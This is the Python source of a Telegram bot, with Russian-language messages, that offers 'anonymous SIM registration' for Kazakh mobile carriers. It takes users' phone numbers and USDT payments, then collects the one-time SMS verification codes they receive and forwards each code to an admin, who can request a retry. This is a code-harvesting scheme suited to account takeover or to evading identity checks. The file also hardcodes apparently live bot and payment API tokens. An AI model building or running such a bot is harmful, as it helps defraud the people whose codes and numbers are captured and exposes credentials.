import asyncio
import logging
import re
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiocryptopay import AioCryptoPay, Networks

# ================= НАСТРОЙКИ =================
TOKEN = "8644586406:AAE77FSG_ddArp7DnhkpMu8HtQy5SaqItgE"
ADMIN_ID = 8209617821
CRYPTO_TOKEN = "552977:AABwZSaXYMIl5cJIpPZgfGgE5tek7vHNaX4"

FREE_MODE = True
PRICE_USD = 2.58

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

crypto = AioCryptoPay(
    token=CRYPTO_TOKEN.strip(),
    network=Networks.MAIN_NET
)

router = Router()
dp.include_router(router)

# Список всех пользователей, которые взаимодействовали с ботом
all_users: set[int] = set()

pending_requests: List[Dict[str, Any]] = []

class RegForm(StatesGroup):
    operator = State()
    phone = State()

class AdminStates(StatesGroup):
    broadcast = State()
    search_phone = State()

# ================= КЛАВИАТУРЫ =================
def get_main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📞 Зарегистрировать номер")]],
        resize_keyboard=True
    )

def get_operators_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Activ"), KeyboardButton(text="Tele2"), KeyboardButton(text="Altel")],
            [KeyboardButton(text="← Назад")]
        ],
        resize_keyboard=True
    )

def get_admin_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📢 Рассылка всем")],
            [KeyboardButton(text="📋 Все заявки")],
            [KeyboardButton(text="🔍 Поиск по номеру")],
            [KeyboardButton(text="← Выйти из админки")]
        ],
        resize_keyboard=True
    )

# ================= ХЕНДЛЕРЫ =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    all_users.add(message.chat.id)
    status = "🆓 ТЕСТОВЫЙ РЕЖИМ (БЕСПЛАТНО)" if FREE_MODE else f"💰 ЦЕНА: ${PRICE_USD} USDT"
    await message.answer(
        f"👋 Привет! Анонимная регистрация SIM.\n\n{status}",
        reply_markup=get_main_kb()
    )

@router.message(F.text.in_({"/admin", "админ", "admin"}))
async def admin_panel(message: Message):
    if message.chat.id != ADMIN_ID:
        return await message.answer("Доступ запрещён")
    await message.answer("🛠 Админ-панель", reply_markup=get_admin_kb())

@router.message(F.text == "← Выйти из админки")
async def exit_admin(message: Message):
    if message.chat.id != ADMIN_ID:
        return
    await message.answer("↩️ Обычный режим", reply_markup=get_main_kb())

# ───────────────────────────────────────────────
# Рассылка всем
# ───────────────────────────────────────────────
@router.message(F.text == "📢 Рассылка всем")
async def start_broadcast(message: Message, state: FSMContext):
    if message.chat.id != ADMIN_ID:
        return
    await message.answer(
        "Введите текст рассылки всем пользователям\n\n"
        "Для отмены напишите: отмена",
        reply_markup=None
    )
    await state.set_state(AdminStates.broadcast)

@router.message(AdminStates.broadcast)
async def process_broadcast(message: Message, state: FSMContext):
    if message.chat.id != ADMIN_ID:
        return

    if message.text.lower() in {"отмена", "/отмена"}:
        await state.clear()
        await message.answer("Рассылка отменена", reply_markup=get_admin_kb())
        return

    text = message.text
    success = 0
    failed = 0

    for uid in list(all_users):
        try:
            await bot.send_message(uid, text)
            success += 1
        except:
            failed += 1

    await message.answer(
        f"Рассылка завершена\nУспешно: {success}\nНе удалось: {failed}\nВсего: {len(all_users)}",
        reply_markup=get_admin_kb()
    )
    await state.clear()

# ───────────────────────────────────────────────
# Все заявки
# ───────────────────────────────────────────────
@router.message(F.text == "📋 Все заявки")
async def show_all_requests(message: Message):
    if message.chat.id != ADMIN_ID:
        return

    if not pending_requests:
        return await message.answer("Заявок пока нет", reply_markup=get_admin_kb())

    lines = ["📋 Заявки:\n"]
    for r in pending_requests:
        emoji = {"waiting_pay": "💳", "waiting_sms": "🔑", "completed": "✅"}.get(r["status"], "❓")
        lines.append(
            f"#{r['id']} {emoji} {r['status']}\n"
            f"Юзер: {r['username']}\n"
            f"Номер: {r['phone']}\n"
            f"Оп: {r['operator']}\n"
            "───────────────\n"
        )

    text = "".join(lines)
    if len(text) > 3800:
        for i in range(0, len(text), 3800):
            await message.answer(text[i:i+3800])
    else:
        await message.answer(text or "Пусто", reply_markup=get_admin_kb())

# ───────────────────────────────────────────────
# Поиск по номеру
# ───────────────────────────────────────────────
@router.message(F.text == "🔍 Поиск по номеру")
async def start_search(message: Message, state: FSMContext):
    if message.chat.id != ADMIN_ID:
        return
    await message.answer(
        "Введите номер (или его часть) для поиска:\nПример: 747 или 77123\n\nОтмена → отмена",
        reply_markup=None
    )
    await state.set_state(AdminStates.search_phone)

@router.message(AdminStates.search_phone)
async def process_search(message: Message, state: FSMContext):
    if message.chat.id != ADMIN_ID:
        return

    if message.text.lower() in {"отмена", "/отмена"}:
        await state.clear()
        await message.answer("Поиск отменён", reply_markup=get_admin_kb())
        return

    query = re.sub(r"\D", "", message.text).strip()
    if not query:
        await message.answer("Ничего не введено. Попробуйте снова или отмена")
        return

    found = [r for r in pending_requests if query in r["phone"]]

    if not found:
        await message.answer(f"По '{query}' ничего не найдено", reply_markup=get_admin_kb())
    else:
        lines = [f"Найдено {len(found)}:\n"]
        for r in found:
            lines.append(
                f"#{r['id']} | {r['status']}\n"
                f"{r['username']}\n"
                f"{r['phone']} | {r['operator']}\n"
                "───────────────\n"
            )
        await message.answer("".join(lines), reply_markup=get_admin_kb())

    await state.clear()

# ───────────────────────────────────────────────
# Остальные хендлеры (регистрация, оплата, коды и т.д.)
# ───────────────────────────────────────────────
@router.message(F.text == "📞 Зарегистрировать номер")
async def start_reg(message: Message, state: FSMContext):
    all_users.add(message.chat.id)
    await state.clear()
    await message.answer("📊 Выбери оператора:", reply_markup=get_operators_kb())
    await state.set_state(RegForm.operator)

@router.message(F.text == "← Назад")
async def back_to_main(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("↩️ Главное меню", reply_markup=get_main_kb())

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_op(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(
        f"📱 Оператор: {message.text}\n\nВведи номер (77xxxxxxxx):",
        reply_markup=get_operators_kb()
    )
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    all_users.add(message.chat.id)
    phone = re.sub(r"\D", "", message.text)
    if len(phone) != 10 or not phone.startswith("7"):
        await message.answer("❌ Номер должен быть 10 цифр и начинаться с 7\nПример: 7712345678")
        return

    data = await state.get_data()
    user_info = f"@{message.from_user.username or ''}" or f"ID{message.from_user.id}"

    if FREE_MODE:
        rid = len(pending_requests) + 1
        pending_requests.append({
            "id": rid, "user_id": message.chat.id, "username": user_info,
            "phone": phone, "operator": data['operator'], "status": "waiting_sms"
        })
        await message.answer("✅ Заявка принята! Пришли код из СМС:")
        await bot.send_message(ADMIN_ID, 
            f"🆓 ТЕСТ\n#{rid} | {user_info}\n{phone} | {data['operator']}")
        await state.clear()
        return

    try:
        invoice = await crypto.create_invoice(
            asset="USDT", amount=PRICE_USD,
            description=f"Регистрация {phone} ({data['operator']})"
        )
        if not hasattr(invoice, "bot_invoice_url"):
            raise AttributeError("Нет bot_invoice_url")

        rid = invoice.invoice_id
        pending_requests.append({
            "id": rid, "user_id": message.chat.id, "username": user_info,
            "phone": phone, "operator": data['operator'], "status": "waiting_pay"
        })

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить", url=invoice.bot_invoice_url)],
            [InlineKeyboardButton(text="🔄 Проверить", callback_data=f"check_{rid}")]
        ])
        await message.answer(
            f"Заявка #{rid}\nСумма: {PRICE_USD} USDT\nНомер: {phone}",
            reply_markup=kb
        )
        await state.clear()
    except Exception as e:
        logging.exception("Ошибка инвойса")
        await message.answer(f"⚠️ Ошибка: {str(e)[:100]}")

@router.callback_query(F.data.startswith("check_"))
async def check_payment(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    try:
        invoices = await crypto.get_invoices(status="paid")
        is_paid = any(i.invoice_id == rid for i in (invoices.result or []))
        if is_paid:
            for r in pending_requests:
                if r["id"] == rid and r["status"] == "waiting_pay":
                    r["status"] = "waiting_sms"
                    await callback.message.edit_text("✅ Оплачено! Пришли код из СМС")
                    await callback.answer("Оплата найдена")
                    return
        await callback.answer("Оплата ещё не пришла", show_alert=True)
    except Exception as e:
        logging.exception("check_payment error")
        await callback.answer("Ошибка проверки", show_alert=True)

@router.message()
async def catch_sms(message: Message):
    all_users.add(message.chat.id)
    if message.chat.id == ADMIN_ID:
        return

    req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms"), None)
    if not req:
        return

    code = message.text.strip()
    if not code.isdigit():
        await message.answer("Только цифры из СМС пожалуйста")
        return

    await message.answer("Код принят, жди...")

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🏁 Завершить", callback_data=f"done_{req['id']}"),
        InlineKeyboardButton(text="🔄 Повторить код", callback_data=f"repeat_{req['id']}")
    ]])

    await bot.send_message(
        ADMIN_ID,
        f"🔑 КОД\nЗаявка: {req['id']}\n{req['username']}\n{req['phone']} | {req['operator']}\nКод: `{code}`",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@router.callback_query(F.data.startswith("done_"))
async def finish_job(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for r in pending_requests:
        if r["id"] == rid:
            r["status"] = "completed"
            await bot.send_message(r["user_id"], "🎉 Регистрация завершена!")
            await callback.message.edit_text(f"Заявка #{rid} закрыта")
            await callback.answer("Готово")
            return
    await callback.answer("Заявка не найдена", show_alert=True)

@router.callback_query(F.data.startswith("repeat_"))
async def repeat_code(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for r in pending_requests:
        if r["id"] == rid:
            if r["status"] != "waiting_sms":
                return await callback.answer("Заявка уже не ждёт код", show_alert=True)

            await bot.send_message(r["user_id"], "Код не подошёл.\nПришли код из СМС ещё раз:")
            await callback.message.edit_text(callback.message.text + "\n\n🔄 Запросили повтор кода")
            await callback.answer("Отправлено пользователю")
            return
    await callback.answer("Заявка не найдена", show_alert=True)

async def main():
    logging.info("Бот запущен")
    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])

if __name__ == "__main__":
    asyncio.run(main())